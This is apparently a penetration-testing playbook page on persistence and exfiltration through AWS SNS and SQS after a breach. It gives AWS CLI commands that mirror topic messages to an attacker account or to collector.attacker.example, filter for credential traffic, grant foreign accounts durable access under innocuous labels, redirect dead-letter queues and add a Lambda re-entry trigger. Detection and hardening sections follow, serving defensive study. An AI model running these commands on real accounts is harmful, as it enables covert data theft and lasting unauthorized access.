---
cstg_id: CSTG-AWS-SNS-SQS-PERSIST
title: "AWS Sns Sqs - Persistence"
provider: aws
service: sns-sqs
phase: persistence
required_access: assumed-breach
required_permissions:
  - sns:Subscribe
  - sns:SetTopicAttributes
  - sns:AddPermission
  - sns:SetSubscriptionAttributes
  - sqs:AddPermission
  - sqs:SetQueueAttributes
  - sqs:CreateQueue
  - lambda:CreateEventSourceMapping
references:
  - "https://docs.aws.amazon.com/sns/latest/dg/sns-message-filtering.html"
  - "https://docs.aws.amazon.com/sns/latest/dg/sns-create-subscribe-endpoint-to-topic.html"
  - "https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-dead-letter-queues.html"
  - "https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-overview.html"
  - "https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html"
tools:
  - AWS CLI
  - Pacu
license: CC BY-SA 4.0
---

## Summary

SNS and SQS make excellent persistence and exfiltration channels because they are designed to deliver copies of data quietly, automatically, and across account boundaries - exactly the properties an attacker wants for a long-lived backdoor. Unlike compute-based persistence (an implant on an instance), a messaging backdoor leaves no host artefact, survives credential rotation on the original foothold (it lives in resource policies, not in the attacker's session), and blends into legitimate event-driven traffic.

The attacker objective is durable, low-noise access to a stream of data and/or a re-entry trigger. The primary techniques are: subscribing an attacker-owned endpoint to a topic so every published message is mirrored out; rewriting resource policies so an external account retains send/receive/subscribe rights; repointing dead-letter queues so retry-able (often credential-bearing) messages drain to attacker storage; and wiring queues to attacker-controlled Lambda for an on-demand execution trigger.

See [aws-sns-sqs-enum.md](../02-services/aws-sns-sqs-enum.md) for target discovery and [aws-sns-sqs-privesc.md](../03-privilege-escalation/aws-sns-sqs-privesc.md) for the related escalation primitives that often establish the access these techniques persist.

## Prerequisites

- An assumed-breach foothold holding one or more of the frontmatter permissions, or a target resource policy that already grants the attacker principal those actions.
- An attacker-controlled receiver: an SQS queue or HTTPS endpoint in a separate (attacker) account to receive mirrored messages, and/or a Lambda function the attacker controls.
- Enumeration output identifying the highest-value topics/queues (those carrying credentials, tokens, PII, or driving privileged consumers).

## Enumeration

Confirm which persistence levers are available and which resources are worth backdooring:

```bash
# Topics carrying high-value data and their current subscriber set
aws sns list-topics --region us-east-1
aws sns list-subscriptions-by-topic --topic-arn <arn> --region us-east-1

# Current resource policies (baseline before/after modification)
aws sns get-topic-attributes --topic-arn <arn> --query 'Attributes.Policy' --region us-east-1
aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy RedrivePolicy --region us-east-1

# Existing event source mappings (to blend a new one in)
aws lambda list-event-source-mappings --region us-east-1
```

## Misconfigurations & Findings

- Topics that allow broad `sns:Subscribe` let an attacker add a hidden subscription that mirrors all messages indefinitely.
- Resource policies the attacker can rewrite (`Set*Attributes`/`AddPermission`) become self-perpetuating grants to an external account.
- Dead-letter queues with weak `RedriveAllowPolicy` or no source pinning can be substituted with an attacker queue, capturing failed messages.
- Subscriptions with `FilterPolicy` allow a stealthy backdoor that mirrors only the most sensitive subset of traffic, keeping volume (and cost/log noise) low.
- Cross-account event source mappings provide a durable execution trigger that survives rotation of the original foothold credential.

## Exploitation

### Mirror subscription (data exfiltration backdoor)

Subscribe an attacker-owned SQS queue or HTTPS endpoint to a high-value topic. Every published message is copied to the attacker indefinitely, with no change to legitimate subscribers.

```bash
# Mirror to an attacker-owned queue in another account
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:111122223333:orders-events \
  --protocol sqs \
  --notification-endpoint arn:aws:sqs:us-east-1:444455556666:exfil-capture \
  --attributes '{"RawMessageDelivery":"true"}' \
  --region us-east-1

# Or mirror to an attacker HTTPS collector
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:111122223333:orders-events \
  --protocol https \
  --notification-endpoint https://collector.attacker.example/sns \
  --region us-east-1
```

To stay quiet, attach a `FilterPolicy` so only sensitive messages are mirrored:

```bash
aws sns set-subscription-attributes \
  --subscription-arn <attacker-subscription-arn> \
  --attribute-name FilterPolicy \
  --attribute-value '{"type":["credential","token","admin"]}' \
  --region us-east-1
```

### Self-granting resource policy backdoor

Rewrite (or extend with `AddPermission`) the topic/queue policy so the attacker's account permanently retains access, independent of the compromised foothold's credentials.

```bash
# Topic: grant attacker account durable Subscribe/Receive
aws sns add-permission \
  --topic-arn arn:aws:sns:us-east-1:111122223333:orders-events \
  --label svc-backup --aws-account-id 444455556666 \
  --action-name Subscribe Receive --region us-east-1

# Queue: grant attacker account durable receive/send
aws sqs add-permission \
  --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders-worker \
  --label svc-backup --aws-account-ids 444455556666 \
  --actions ReceiveMessage SendMessage --region us-east-1
```

Choosing an innocuous `--label` (e.g. `svc-backup`, `replication`) helps the statement survive a cursory review.

### Dead-letter queue redirection

Repoint a queue's `RedrivePolicy` to an attacker-owned DLQ. Messages that exceed `maxReceiveCount` - frequently the ones carrying malformed or sensitive retry data - drain into the attacker's queue.

```bash
aws sqs set-queue-attributes \
  --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders-worker \
  --attributes '{"RedrivePolicy":"{\"deadLetterTargetArn\":\"arn:aws:sqs:us-east-1:444455556666:exfil-dlq\",\"maxReceiveCount\":\"3\"}"}' \
  --region us-east-1
```

For this to deliver cross-account, the attacker's DLQ policy in their own account must allow the source queue to send. This requires no further access in the victim account once set.

### Event source mapping as a re-entry trigger

Wire a queue (one the attacker can write to, or the high-value worker queue itself) to an attacker-controlled Lambda. Sending a crafted message later invokes the function on demand - a durable trigger that does not depend on a persistent session.

```bash
aws lambda create-event-source-mapping \
  --function-name attacker-trigger \
  --event-source-arn arn:aws:sqs:us-east-1:111122223333:orders-worker \
  --batch-size 1 --region us-east-1
```

### Topic delivery-policy tampering

Adjusting a subscription's delivery retry policy or raw-delivery setting can keep the mirror reliable and reduce delivery-failure noise that might otherwise alert operators, reinforcing the longevity of the backdoor.

## Detection & Logging

- **CloudTrail management events** record every persistence action: `Subscribe`, `SetSubscriptionAttributes`, `AddPermission`, `SetTopicAttributes`, `SetQueueAttributes` (including `RedrivePolicy` changes), `CreateQueue`, and `CreateEventSourceMapping`. Alert on:
  - `Subscribe` whose endpoint ARN/URL is outside the organisation's accounts or a non-approved domain.
  - `AddPermission`/`Set*Attributes` that introduce a foreign account ID or `Principal: *` into a resource policy.
  - `SetQueueAttributes` that changes `RedrivePolicy.deadLetterTargetArn` to an out-of-account ARN.
  - new `CreateEventSourceMapping` whose function or source crosses accounts.
- Periodically reconcile the live subscription list (`list-subscriptions-by-topic`) and resource policies against an approved baseline; unexplained subscriptions or policy statements (especially with generic labels) indicate a backdoor.
- **Data events** (`Publish`/`SendMessage`/`ReceiveMessage`) require explicit CloudTrail data-event logging; without it, ongoing exfiltration through an established subscription is invisible. Enable data events on sensitive topics/queues.
- Monitor for steady cross-account delivery and unexpected DLQ traffic via SNS/SQS CloudWatch metrics (`NumberOfNotificationsDelivered`, `ApproximateNumberOfMessagesVisible` on unfamiliar queues).

## Remediation & Hardening

- Restrict `sns:Subscribe` so that only approved principals can add subscriptions, and require manual review/approval of new subscription endpoints; deny endpoints outside the organisation with SCPs or policy conditions.
- Lock down `AddPermission`/`Set*Attributes` to administrators; alert on any change and reconcile against a policy baseline.
- Pin every DLQ with `RedriveAllowPolicy` to known source ARNs and forbid out-of-account `deadLetterTargetArn` values.
- Use SCPs / `aws:PrincipalOrgID` conditions to prevent resource policies from granting access to accounts outside the organisation.
- Enable CloudTrail data events and SNS/SQS CloudWatch alarms to surface ongoing exfiltration through legitimate-looking subscriptions.
- Restrict `lambda:CreateEventSourceMapping` and review event source mappings for cross-account sources/targets.
- Apply SSE with scoped KMS keys so that even captured messages are useless without the key.

## Tools

- **AWS CLI** - performs subscription, policy, redrive, and event-source-mapping operations shown above.
- **Pacu** - automates enumeration of writable/subscribable topics and queues and can establish backdoor subscriptions/policy grants programmatically.

## References

- SNS Message Filtering - https://docs.aws.amazon.com/sns/latest/dg/sns-message-filtering.html
- Subscribing an Endpoint to a Topic - https://docs.aws.amazon.com/sns/latest/dg/sns-create-subscribe-endpoint-to-topic.html
- SQS Dead-Letter Queues - https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-dead-letter-queues.html
- SNS Access Policy Language - https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-overview.html
- SQS Security Best Practices - https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html
